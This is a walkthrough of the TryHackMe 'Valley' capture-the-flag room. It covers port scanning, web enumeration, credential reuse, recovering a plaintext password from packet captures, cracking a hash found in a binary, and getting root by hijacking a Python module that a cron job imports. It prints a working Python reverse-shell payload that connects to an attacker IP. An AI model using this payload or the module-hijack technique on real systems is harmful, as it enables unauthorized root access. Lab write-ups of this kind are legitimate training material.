# Valley (TryHackMe - Easy) Walkthrough

This room is a solid end-to-end chain that reinforces a few core skills:

- Full service discovery (including non-standard ports)
- Web enumeration and dev artifact hunting
- Credential reuse across services
- Reading packet captures to recover secrets
- Post-exploitation enumeration (what can I run as root?)
- Privilege escalation via cron + Python module hijacking

---

## 1) Reconnaissance (Nmap)

Start by scanning **all TCP ports**. This prevents missing services running on unusual ports.

Command:
- `nmap -p- -sC -sV -T4 -oN nmap_scan.txt --min-rate=1000 <IP_ADDRESS>`

What the scan revealed (high-level):
- `22/tcp` SSH (OpenSSH)
- `80/tcp` HTTP (Apache)
- `37370/tcp` FTP (vsftpd) on a **non-standard port**

Why this matters:
- Anything off the defaults (like FTP not on `21`) is often intentional and worth attention.

---

## 2) Web Enumeration (finding `/static` → dev endpoint)

Since port `80` is open, enumerate the site for hidden directories/files.

I ran directory brute forcing and the path that mattered was:

- `/static`

I then enumerated under `/static`:

- `gobuster dir -u http://<IP_ADDRESS>/static -w /usr/share/wordlists/dirb/common.txt -t 50`

From `/static` I found information that pointed to a **developer-related endpoint** (`/dev`), and `/dev` prompted for credentials.

### 2.1) Client-side review (JS) → credentials

When a dev endpoint is protected, it’s worth checking the front-end assets it loads (especially JavaScript). Here, the JavaScript contained credentials for a dev user:

- Username: `siemdev`
- Password: (found in JS)

I used those credentials to log in to the dev area.

Why this works in real life:
- Dev/test environments often leak secrets in client-side code during development.

---

## 3) Credential Reuse → FTP on port `37370`

After logging into the dev area, there was a note warning **not to reuse the same credentials for FTP**.

That’s a strong hint that credential reuse is happening, so I tried the same credentials on FTP.

FTP is running on port `37370`, so connect like:

- `ftp <IP_ADDRESS> 37370`

Inside FTP, I found **three `.pcapng` files**. I downloaded them for analysis.

Why this matters:
- “Don’t reuse passwords” notes are common CTF hints, but credential reuse is also extremely common in real environments.
- Captures/backups/logs are frequently where credentials leak.

---

## 4) Wireshark (PCAP analysis) → recover plaintext creds

I opened the `.pcapng` files in Wireshark.

The first capture wasn’t useful, but one of them contained HTTP traffic with a login request where the credentials were visible in plaintext.

### 4.1) Evidence: HTTP POST form fields include username/password

In the capture, there was an HTTP request:

- `POST /index.html HTTP/1.1`
- `Content-Type: application/x-www-form-urlencoded`

Wireshark decoded the form data and showed:

- `uname = valleyDev`
- `psw = ph0t0s1234`
- `remember = on`

Key point:
- HTTP POST data is not “hidden.” If the login is not protected with HTTPS and you have the traffic, the body can be read.

---

## 5) Use recovered creds → SSH → user flag

SSH was exposed on port `22`, so I attempted to log in using the recovered credentials:

- `ssh valleyDev@<IP_ADDRESS>`

This worked and I was able to obtain the **user flag**.

Why this is the right move:
- SSH gives you a stable interactive shell and is usually the best foothold after you recover credentials.

---

## 6) Post-exploitation enumeration (valleyDev)

First quick check:
- `sudo -l`

In this case, `valleyDev` did not have useful sudo permissions.

When `sudo -l` is a dead end, pivot to “what runs as root automatically?”:
- cron jobs
- scheduled scripts
- systemd timers

I found a root-run script:

- `/photo/script/photosEncrypt.py`

Based on behavior, the script base64-encodes photo files (such as `p1-7.jpg`) in a photos directory using Python’s `base64` module.

Why this is interesting:
- Root-run scripts + Python imports can lead to privilege escalation if you can influence what gets imported.

---

## 7) Horizontal escalation (valleyDev → valley) using a local binary

At this point, I needed more privileges to make meaningful changes. I looked for local artifacts that might contain credentials or hashes.

In the home directory I found an executable:

- `valleyAutentificator`

To copy it to my attacker machine for easier analysis, I hosted it from the target:

On the target:
- `python3 -m http.server`

On my attacker machine:
- `wget http://<IP_ADDRESS>:8000/valleyAutentificator`

Then I extracted readable strings:

- `strings valleyAutentificator > strings.txt`

I searched for password-like content and found an **MD5 hash**, cracked it using Crackstation, then switched users:

- `su valley`
- (enter cracked password)

Why this works:
- `strings` is a fast way to find hardcoded secrets and hashes in binaries (especially in CTF-style challenges).

---

## 8) Privilege escalation to root (cron + Python module hijacking)

The goal:
- Get code execution as root via the cron job that runs `/photo/script/photosEncrypt.py`.

The idea:
- If a root-run Python script imports `base64`, and you can replace the module that gets imported, your code runs as root.

### 8.1) Replace `base64.py` with a malicious one

I replaced the system `base64` module file so that when the root cron job runs, it imports my payload.

1) Backup the original module:
- `mv /usr/lib/python3.8/base64.py /usr/lib/python3.8/base64.py.bak`

2) Write a malicious `base64.py` that opens a reverse shell:

- Replace `LOCAL_IP` and the port with your attacker IP/listener port.

Example payload:

```/dev/null/base64.py#L1-18
#!/usr/bin/python3
from os import dup2
from subprocess import run
import socket

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("LOCAL_IP", 1234))
dup2(s.fileno(), 0)
dup2(s.fileno(), 1)
dup2(s.fileno(), 2)
run(["/bin/bash", "-i"])
```

3) Start a listener on your attacker machine, then wait for cron to execute the root script.

Once cron ran and imported `base64`, my malicious module executed and I received a **root shell**, allowing me to read the **root flag**.

Why this works:
- Python imports execute code at import time.
- A scheduled/root context provides the privilege boundary.
- If the interpreter imports from a location you can modify, that import becomes code execution.

---

## Wrap-up

Attack chain summary:

1. Nmap found SSH/HTTP and FTP on a non-standard port
2. Web enumeration found `/static`, which led to `/dev`
3. JS leaked `siemdev` credentials
4. Credentials reused for FTP on port `37370`
5. PCAP analysis in Wireshark exposed `valleyDev : ph0t0s1234` from an HTTP POST
6. SSH access as `valleyDev` → user flag
7. `valleyAutentificator` analysis (strings + MD5 crack) → `su valley`
8. Root cron + Python module hijacking (`base64.py`) → root shell → root flag